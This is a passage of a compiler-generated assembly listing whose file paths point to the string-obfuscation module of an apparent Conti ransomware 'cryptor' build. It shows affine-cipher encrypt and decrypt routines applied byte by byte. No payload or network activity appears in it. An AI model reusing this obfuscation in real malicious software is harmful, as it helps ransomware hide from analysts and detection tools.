  008d1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  008d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008dd	88 41 35	 mov	 BYTE PTR [rcx+53], al
  008e0	b8 01 00 00 00	 mov	 eax, 1
  008e5	48 6b c0 35	 imul	 rax, rax, 53		; 00000035H
  008e9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008f0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008f4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008fb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00900	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00907	88 41 36	 mov	 BYTE PTR [rcx+54], al
  0090a	b8 01 00 00 00	 mov	 eax, 1
  0090f	48 6b c0 36	 imul	 rax, rax, 54		; 00000036H
  00913	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0091a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0091e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00925	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0092a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00931	88 41 37	 mov	 BYTE PTR [rcx+55], al
  00934	b8 01 00 00 00	 mov	 eax, 1
  00939	48 6b c0 37	 imul	 rax, rax, 55		; 00000037H
  0093d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00944	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00948	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0094f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00954	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0095b	88 41 38	 mov	 BYTE PTR [rcx+56], al
  0095e	b8 01 00 00 00	 mov	 eax, 1
  00963	48 6b c0 38	 imul	 rax, rax, 56		; 00000038H
  00967	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0096e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00972	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00979	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0097e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00985	88 41 39	 mov	 BYTE PTR [rcx+57], al
  00988	b8 01 00 00 00	 mov	 eax, 1
  0098d	48 6b c0 39	 imul	 rax, rax, 57		; 00000039H
  00991	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00998	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0099c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009a3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  009a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009af	88 41 3a	 mov	 BYTE PTR [rcx+58], al
  009b2	b8 01 00 00 00	 mov	 eax, 1
  009b7	48 6b c0 3a	 imul	 rax, rax, 58		; 0000003aH
  009bb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009c2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009c6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009cd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  009d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009d9	88 41 3b	 mov	 BYTE PTR [rcx+59], al
  009dc	b8 01 00 00 00	 mov	 eax, 1
  009e1	48 6b c0 3b	 imul	 rax, rax, 59		; 0000003bH
  009e5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009ec	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009f0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009f7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  009fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a03	88 41 3c	 mov	 BYTE PTR [rcx+60], al
  00a06	b8 01 00 00 00	 mov	 eax, 1
  00a0b	48 6b c0 3c	 imul	 rax, rax, 60		; 0000003cH
  00a0f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a16	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a1a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a21	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00a26	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a2d	88 41 3d	 mov	 BYTE PTR [rcx+61], al
  00a30	b8 01 00 00 00	 mov	 eax, 1
  00a35	48 6b c0 3d	 imul	 rax, rax, 61		; 0000003dH
  00a39	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a40	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a44	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a4b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00a50	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a57	88 41 3e	 mov	 BYTE PTR [rcx+62], al
  00a5a	b8 01 00 00 00	 mov	 eax, 1
  00a5f	48 6b c0 3e	 imul	 rax, rax, 62		; 0000003eH
  00a63	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a6a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a6e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a75	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00a7a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a81	88 41 3f	 mov	 BYTE PTR [rcx+63], al
  00a84	b8 01 00 00 00	 mov	 eax, 1
  00a89	48 6b c0 3f	 imul	 rax, rax, 63		; 0000003fH
  00a8d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a94	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a98	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a9f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00aa4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aab	88 41 40	 mov	 BYTE PTR [rcx+64], al
  00aae	b8 01 00 00 00	 mov	 eax, 1
  00ab3	48 6b c0 40	 imul	 rax, rax, 64		; 00000040H
  00ab7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00abe	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00ac2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ac9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00ace	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ad5	88 41 41	 mov	 BYTE PTR [rcx+65], al
  00ad8	b8 01 00 00 00	 mov	 eax, 1
  00add	48 6b c0 41	 imul	 rax, rax, 65		; 00000041H
  00ae1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ae8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00aec	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00af3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00af8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aff	88 41 42	 mov	 BYTE PTR [rcx+66], al
  00b02	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00b09	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00b0d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv560[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00b13	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00b1a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00b21	5f		 pop	 rdi
  00b22	5d		 pop	 rbp
  00b23	c3		 ret	 0
??0?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 59	 sub	 eax, 89			; 00000059H
  0002d	6b c0 c1	 imul	 eax, eax, -63		; ffffffffffffffc1H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
